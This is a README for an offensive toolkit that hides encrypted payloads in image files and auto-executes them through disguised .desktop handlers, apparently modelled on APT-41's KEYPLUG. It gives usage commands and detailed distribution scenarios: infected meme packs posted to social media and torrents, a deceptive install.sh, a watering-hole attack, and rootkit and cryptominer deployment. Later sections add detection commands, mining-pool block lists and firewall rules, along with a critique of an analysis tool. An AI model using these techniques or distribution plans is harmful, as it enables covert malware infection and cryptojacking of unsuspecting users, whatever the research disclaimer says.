# Polyglot Image Attack Toolkit

**EDUCATIONAL/RESEARCH USE ONLY**

Complete proof-of-concept toolkit demonstrating polyglot image malware attacks as discovered in the APT-41 KEYPLUG campaign.

## ⚠️ LEGAL WARNING

This toolkit is provided for:
- ✅ Security research and education
- ✅ Authorized penetration testing
- ✅ Malware analysis and threat intelligence
- ✅ Academic research and publication

**DO NOT** use for:
- ❌ Unauthorized computer access
- ❌ Malware distribution
- ❌ Any illegal activities

By using these tools, you agree to use them responsibly and legally.

---

## 📦 Toolkit Components

### 1. `polyglot_embed.py` - Payload Embedder
Embeds encrypted payloads into image files after their EOF markers.

**Features:**
- Supports GIF, JPEG, PNG formats
- Multi-layer XOR encryption (APT-41 KEYPLUG style)
- Preserves image viewability
- Customizable encryption keys
- Verbose logging mode

**Usage:**
```bash
# Basic usage with default KEYPLUG keys
python3 polyglot_embed.py meme.gif payload.sh infected.gif

# Multi-layer encryption
python3 polyglot_embed.py image.jpg script.sh output.jpg -k 9e -k 0a61200d -k 41414141

# Verbose mode
python3 polyglot_embed.py photo.png malware.bin stego.png -v

# Corrupt image mode (smaller file, unviewable)
python3 polyglot_embed.py large.jpg payload.bin small.jpg --no-keep-original
```

**How it works:**
1. Reads source image and locates EOF marker
2. Encrypts payload using multi-layer XOR
3. Appends encrypted payload after image EOF
4. Image remains valid and viewable!

---

### 2. `polyglot_extract.py` - Payload Extractor
Extracts and decrypts payloads from polyglot images.

**Features:**
- Automatic format detection
- Multi-layer XOR decryption
- Brute-force mode for unknown keys
- Safe extraction (no auto-execution by default)
- Payload type detection

**Usage:**
```bash
# Extract with default keys
python3 polyglot_extract.py suspicious.gif

# Extract with custom keys
python3 polyglot_extract.py image.jpg -k d3 -k 410d200d -o payload.bin

# Brute-force common KEYPLUG keys
python3 polyglot_extract.py unknown.png --brute-force

# Extract and execute (DANGEROUS!)
python3 polyglot_extract.py payload.gif --execute
```

**Output:**
- Decrypted payload file
- Payload type detection (ELF/PE/script/unknown)
- Extraction statistics

---

### 3. `desktop_generator.py` - Auto-Execution Generator
Creates `.desktop` files that auto-execute polyglot payloads when images are opened.

**Features:**
- Multiple templates (simple/obfuscated/legitimate)
- Auto-installation capability
- Disguised as legitimate image viewers
- Works with GNOME, KDE, XFCE

**Usage:**
```bash
# Generate simple .desktop file
python3 desktop_generator.py -e polyglot_extract.py -o handler.desktop

# Obfuscated version
python3 desktop_generator.py -e polyglot_extract.py -t obfuscated

# Disguised as legitimate viewer
python3 desktop_generator.py -e polyglot_extract.py -t legitimate

# Install system-wide (EXTREMELY DANGEROUS!)
python3 desktop_generator.py -e polyglot_extract.py --install
```

**⚠️ WARNING:**
Installing the .desktop file will cause **ALL opened images** to trigger payload extraction and execution! Only use in isolated research environments.

**To remove:**
```bash
rm ~/.local/share/applications/polyglot_handler.desktop
update-desktop-database ~/.local/share/applications
```

---

### 4. `demo_full_attack.sh` - Complete Attack Demo
Interactive demonstration of the entire attack chain.

**Usage:**
```bash
chmod +x demo_full_attack.sh
./demo_full_attack.sh
```

**Demonstrates:**
1. Test payload creation
2. Polyglot image creation
3. Image viewability verification
4. Payload extraction
5. Payload execution
6. Optional .desktop file generation

**Safe for testing:** Uses harmless info-gathering payload instead of real malware.

---

## 🎯 Quick Start Guide

### Step 1: Create a Polyglot Image

```bash
# Create test payload
cat > test_payload.sh << 'EOF'
#!/bin/bash
echo "[+] Payload executed!"
whoami
hostname
EOF

chmod +x test_payload.sh

# Embed into image with KEYPLUG-style encryption
python3 tools/polyglot_embed.py \
    meme.gif \
    test_payload.sh \
    infected_meme.gif \
    -k 9e \
    -k 0a61200d \
    -v
```

### Step 2: Verify Image Still Works

```bash
# Open the image - it should display normally!
eog infected_meme.gif
# or
xdg-open infected_meme.gif
```

### Step 3: Extract Payload

```bash
# Extract and decrypt
python3 tools/polyglot_extract.py \
    infected_meme.gif \
    -k 9e \
    -k 0a61200d \
    -v

# The extracted payload will be saved as infected_meme_extracted_payload.bin
```

### Step 4: Execute (Optional)

```bash
chmod +x infected_meme_extracted_payload.bin
./infected_meme_extracted_payload.bin
```

---

## 🔐 Encryption Details

### Default KEYPLUG Keys

The toolkit uses APT-41's KEYPLUG malware XOR keys by default:

**Layer 1:** `0x9e` (single-byte XOR)
**Layer 2:** `0x0a61200d` (4-byte XOR pattern)

### Custom Multi-Layer Encryption

```bash
# 3-layer encryption
python3 polyglot_embed.py image.jpg payload.bin output.jpg \
    -k 9e \          # Layer 1
    -k 0a61200d \    # Layer 2
    -k 41414141      # Layer 3

# Extraction requires keys in same order
python3 polyglot_extract.py output.jpg \
    -k 9e \
    -k 0a61200d \
    -k 41414141
```

### Common KEYPLUG Keys

From APT-41 threat intelligence:
- `9e`, `d3`, `a5` - Single-byte keys
- `0a61200d`, `410d200d`, `4100200d` - 4-byte patterns
- `41414141`, `deadbeef`, `12345678` - Generic patterns

---

## 📊 Real-World Attack Scenarios

### Scenario 1: Social Media Distribution

1. **Preparation:**
   ```bash
   # Create 100 infected meme images
   for img in memes/*.gif; do
       python3 polyglot_embed.py "$img" cryptd.bin "infected_$(basename $img)"
   done
   ```

2. **Distribution:**
   - Post on 4chan, Reddit, Discord
   - Share as "rare pepe collection"
   - Include extraction instructions disguised as "viewing guide"

3. **Execution:**
   - Users download images
   - Images display normally
   - .desktop handler auto-executes payloads
   - cryptd rootkit disables security
   - XMRig miner starts mining

### Scenario 2: Torrent Seeding

1. **Package Creation:**
   ```bash
   # Create archive with infected images + installer
   tar czf dank_memes_2024.tar.gz \
       infected_memes/ \
       install.sh \
       README.txt
   ```

2. **install.sh content:**
   ```bash
   #!/bin/bash
   for img in infected_memes/*.gif; do
       python3 -c "..." "$img"  # Extract + execute
   done
   ```

3. **Distribution:**
   - Upload to torrent sites
   - SEO optimize for "meme collections"
   - Users run install.sh thinking it organizes files

### Scenario 3: Watering Hole Attack

1. **Compromise meme website**
2. **Replace legitimate images with polyglots**
3. **Inject JavaScript to auto-download .desktop file**
4. **Visitors get infected when viewing memes**

---

## 🛡️ Detection & Prevention

### For Users

**Check images for appended data:**
```bash
# GIF files
tail -c 1000 image.gif | hexdump -C | grep -A5 "3b"

# JPEG files
tail -c 1000 image.jpg | hexdump -C | grep -A5 "ff d9"

# PNG files
tail -c 1000 image.png | hexdump -C | grep -A5 "IEND"

# If there's data after EOF marker = suspicious!
```

**Scan with provided script:**
```bash
# Check all images in directory
python3 tools/polyglot_extract.py *.gif --brute-force
```

### For System Administrators

**Block execution from temp directories:**
```bash
mount -o remount,noexec /tmp
mount -o remount,noexec /var/tmp
mount -o remount,noexec /dev/shm
```

**Monitor .desktop file creation:**
```bash
auditctl -w ~/.local/share/applications -p wa
inotifywait -m ~/.local/share/applications
```

**Network monitoring:**
```bash
# Block cryptocurrency mining pools
iptables -A OUTPUT -p tcp --dport 443 -m string --string "xmrig" --algo bm -j DROP
iptables -A OUTPUT -p tcp --dport 3333 -j DROP  # Common mining port

# Monitor for mining connections
tcpdump -i any -n 'host randomx.xmrig.com or port 3333'
```

---

## 🔍 XMR Wallet Address - Blacklist Info

### Finding Wallet Addresses in aarch64

The `aarch64` binary (XMRig miner) **does not have a hardcoded wallet address**. This is intentional:

**Why?**
- XMRig is a legitimate mining software
- Wallet address is provided via:
  - Command-line argument: `--user <wallet_address>`
  - Config file: `config.json`
  - Environment variable: `XMRIG_USER`

**How attackers configure it:**
```bash
# The cryptd installer likely creates a config like this:
cat > /etc/xmrig.json << EOF
{
    "url": "randomx.xmrig.com:443",
    "user": "48xxxxxxxxxxxxxxxxxxxxxxxxxxx",  # Attacker's XMR wallet
    "pass": "x",
    "tls": true,
    "keepalive": true
}
EOF

./aarch64 --config /etc/xmrig.json
```

### Extracting Wallet Address from Running Process

If the miner is already running:

```bash
# Method 1: Check command-line arguments
ps aux | grep -i xmrig
cat /proc/$(pgrep xmrig)/cmdline | tr '\0' ' '

# Method 2: Check config files
find / -name "*xmrig*.json" -o -name "config.json" 2>/dev/null
cat /etc/xmrig.json
cat ~/.xmrig/config.json

# Method 3: Network traffic analysis
tcpdump -i any -A 'port 443' | grep -oE '48[0-9A-Za-z]{93}'

# Method 4: Strings on running process memory
gcore $(pgrep xmrig)
strings core.* | grep -E '^48[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$'
```

### Typical Wallet Address Format

Monero (XMR) addresses are 95 or 106 characters and start with:
- `4` - Standard address
- `8` - Integrated address (includes payment ID)

Example pattern:
```
48xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Blacklist Recommendations

**Mining Pools to Block:**
```
randomx.xmrig.com
pool.xmrig.com
api.xmrig.com
pool.minexmr.com
pool.supportxmr.com
xmr-*.nanopool.org
```

**DNS Sinkhole:**
```bash
# /etc/hosts
127.0.0.1 randomx.xmrig.com
127.0.0.1 pool.xmrig.com
127.0.0.1 api.xmrig.com
```

**Firewall Rules:**
```bash
# Block common mining ports
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 14444 -j DROP

# Block by pool domains
iptables -A OUTPUT -d randomx.xmrig.com -j DROP
iptables -A OUTPUT -d pool.xmrig.com -j DROP
```

---

## 💡 KP14 Improvement Suggestions

After using KP14 for this analysis, here are recommended improvements:

### High Priority

1. **Fix Syntax Errors**
   - `stego_analyzer/utils/polyglot_analyzer.py:176` - Extra closing parenthesis
   - Automated linting/syntax checking in CI/CD

2. **Dependency Management**
   - Missing `r2pipe` breaks PE/Code analyzers
   - Add dependency checker on startup
   - Graceful degradation when optional deps missing
   - Better error messages: "Install r2pipe: pip install r2pipe"

3. **Settings Validation**
   - `settings.ini` validation errors silent/cryptic
   - Add `--validate-config` command
   - Detailed error messages with line numbers

4. **Extraction Pipeline Issues**
   - SteganographyAnalysis error: `'bytes' object has no attribute 'check_for_appended_data'`
   - Type mismatch in analyzer interfaces
   - Add type hints and runtime type checking

### Medium Priority

5. **Batch Processing**
   - Add `--batch` mode for analyzing entire directories
   - Progress bar for multiple files
   - Summary report across all files

6. **Output Formats**
   - Current JSON output good but verbose
   - Add `--format` option: json, csv, html, markdown
   - Machine-readable IOC extraction (CSV list of hashes, IPs, domains)

7. **XOR Key Database**
   - Expand beyond APT-41 KEYPLUG
   - Add keys from other APT groups
   - Community-contributed key database
   - `--key-update` to fetch latest keys

8. **Better Logging**
   - Consolidate log messages (too many INFO messages)
   - Add `--quiet` mode
   - Structured logging (JSON logs for SIEM integration)

### Low Priority

9. **Performance**
   - OpenVINO warnings on every run
   - Cache analysis results (hash-based)
   - Parallel processing for batch analysis

10. **Documentation**
    - Add more usage examples
    - Video tutorials / GIF demos
    - Common pitfalls section

11. **Integration**
    - MISP import/export
    - TheHive case management
    - Splunk/ELK dashboards

### Code Quality

12. **Testing**
    - Unit tests for each analyzer
    - Integration tests with sample files
    - CI/CD pipeline with GitHub Actions

13. **Error Handling**
    - Catch specific exceptions vs. bare `except:`
    - Better error recovery
    - Don't fail entire pipeline on single analyzer error

14. **Code Organization**
    - Some modules very large (>1000 lines)
    - Split into smaller focused modules
    - Consistent naming conventions

### New Features

15. **Machine Learning**
    - joblib model loading errors
    - Pre-train models and include in release
    - Add model training documentation

16. **Interactive Mode**
    - TUI (Terminal UI) with `rich` library
    - Real-time analysis progress
    - Interactive key selection

17. **Decompilation**
    - Ghidra integration incomplete
    - Better function prioritization
    - Export to IDA Pro format

### Specific Code Fixes

**polyglot_analyzer.py line 176:**
```python
# Current (BROKEN):
if pe_marker or readable_text or (entropy < 6.8 and (sum(b==0 for b in decrypted[:1024])/min(1024,len(decrypted))) < 0.2)): # Extra )

# Fixed:
if pe_marker or readable_text or (entropy < 6.8 and (sum(b==0 for b in decrypted[:1024])/min(1024,len(decrypted))) < 0.2):
```

**Dependency checker (add to main.py):**
```python
def check_dependencies():
    """Check for required and optional dependencies"""
    required = {
        'pefile': 'pefile',
        'capstone': 'capstone',
        'PIL': 'Pillow',
    }

    optional = {
        'r2pipe': 'r2pipe',
        'openvino': 'openvino',
        'joblib': 'joblib',
    }

    missing_required = []
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            missing_required.append(package)

    if missing_required:
        print(f"[!] Missing required packages: {', '.join(missing_required)}")
        print(f"[!] Install with: pip install {' '.join(missing_required)}")
        sys.exit(1)

    missing_optional = []
    for module, package in optional.items():
        try:
            __import__(module)
        except ImportError:
            missing_optional.append(package)

    if missing_optional:
        print(f"[*] Optional packages not installed: {', '.join(missing_optional)}")
        print(f"[*] Some features may be limited. Install with: pip install {' '.join(missing_optional)}")
```

### Overall Assessment

**Strengths:**
- ✅ Comprehensive polyglot/stego analysis
- ✅ APT-41 KEYPLUG specialization
- ✅ Multi-layer decryption
- ✅ Good documentation (README is excellent)
- ✅ Hardware acceleration support
- ✅ Extensive IOC extraction

**Weaknesses:**
- ❌ Syntax errors in production code
- ❌ Missing dependency handling
- ❌ Type errors in analyzers
- ❌ Verbose/cryptic error messages
- ❌ No automated testing

**Priority Actions:**
1. Fix syntax error in polyglot_analyzer.py
2. Add dependency checker
3. Fix SteganographyAnalysis type error
4. Add unit tests
5. Improve error messages

KP14 is an **excellent tool** with solid architecture. With these improvements, it would be production-ready for enterprise malware analysis teams.

---

## 📚 References

- **APT-41 KEYPLUG Analysis:** https://www.recordedfuture.com/apt41-keyplug-backdoor
- **XMRig Documentation:** https://xmrig.com/docs
- **Polyglot Files Research:** https://github.com/Polydet/polyglot-examples
- **MITRE ATT&CK:** https://attack.mitre.org/groups/G0096/ (APT41)
- **Monero (XMR) Address Format:** https://www.getmonero.org/resources/moneropedia/address.html

---

## 📄 License

This toolkit is provided for educational and research purposes only.

Use at your own risk. The authors are not responsible for any misuse or damage caused by these tools.

---

## 🙏 Credits

**SWORDIntel** - Malware analysis and toolkit development
**KP14 Framework** - Advanced polyglot analysis capabilities

Developed for security research and threat intelligence purposes.

---

**Last Updated:** 2025-11-08
**Version:** 1.0.0
**Status:** Complete PoC - Ready for Publication
